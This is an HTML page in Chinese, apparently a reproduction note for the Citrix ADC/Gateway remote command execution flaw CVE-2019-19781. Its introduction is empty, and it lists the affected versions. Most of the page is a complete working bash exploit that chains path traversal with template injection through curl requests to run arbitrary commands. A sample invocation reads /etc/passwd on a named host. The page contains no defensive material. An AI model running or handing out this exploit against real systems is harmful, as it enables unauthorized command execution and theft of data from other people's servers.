<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-19781citrix-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-19781</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Citrix </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">13.x,12.1,12.0,11.1,10.5</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">bash CVE-2019-19781.sh www.0-sec.org &#39;cat /etc/passwd&#39;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs3A447A38"><span class="cs9FB05234">CVE-2019-19781.sh</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/bin/bash</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Remote Code Execution Exploit for Citrix Application Delivery Controller and Citrix Gateway - CVE-2019-19781</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Usage : bash CVE-2019-19781.sh IP_OF_VULNURABLE_HOST COMMAND_TO_EXECUTE e.g : bash CVE-2019-19781.sh XX.XX.XX.XX &#39;uname -a&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Release Date : 11/01/2020</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Follow Us : https://twitter.com/ProjectZeroIN / https://github.com/projectzeroindia</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;=================================================================================</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> ___ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ &nbsp;&nbsp;&nbsp;&nbsp;____ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ &nbsp;_</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| _ \ _ _ &nbsp;___ &nbsp;(_) ___ &nbsp;__ | |_ &nbsp;|_ &nbsp;/ ___ &nbsp;_ _ &nbsp;___ &nbsp;|_ _| _ _ &nbsp;&nbsp;__| |(_) __ _</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| &nbsp;_/| &#39;_|/ _ \ | |/ -_)/ _|| &nbsp;_| &nbsp;/ / / -_)| &#39;_|/ _ \ &nbsp;| | | &#39; \ / _&#39; || |/ _&#39; |</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">|_| &nbsp;|_| &nbsp;\___/_/ |\___|\__| \__| /___|\___||_| &nbsp;\___/ |___||_||_|\__,_||_|\__,_|</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|__/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2019-19781</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">=================================================================================&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">##############################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if [ -z &quot;$1&quot; ];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">then</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -ne &#39;Usage : bash CVE-2019-19781.sh IP_OF_VULNURABLE_HOST COMMAND_TO_EXECUTE\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exit;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">export LC_CTYPE=C</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">filenameid=$(cat /dev/urandom | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 32 | head -n 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl -s -k &quot;https://$1/vpn/../vpns/portal/scripts/newbm.pl&quot; -d &quot;url=http://example.com\&amp;title=[%25+template.new({&#39;BLOCK&#39;%3d&#39;exec(\&#39;$2 | tee /netscaler/portal/templates/$filenameid.xml\&#39;)%3b&#39;})+%25]\&amp;desc=test\&amp;UI_inuse=RfWeb&quot; -H &quot;NSC_USER: /../../../../../../../../../../netscaler/portal/templates/$filenameid&quot; -H &#39;NSC_NONCE: test1337&#39; -H &#39;Content-type: application/x-www-form-urlencoded&#39; --path-as-is</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -ne &quot;\n&quot; ;curl -m 3 -k &quot;https://$1/vpn/../vpns/portal/$filenameid.xml&quot; -s -H &quot;NSC_NONCE: pwnpzi1337&quot; -H &quot;NSC_USER: pwnpzi1337&quot; --path-as-is</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo -ne &quot;Command Output :\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl -m 3 -k &quot;https://$1/vpn/../vpns/portal/$filenameid.xml&quot; -H &quot;NSC_NONCE: pwnpzi1337&quot; -H &quot;NSC_USER: pwnpzi1337&quot; --path-as-is</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&copy; 2020 GitHub, Inc.</span></p></body>
</html>
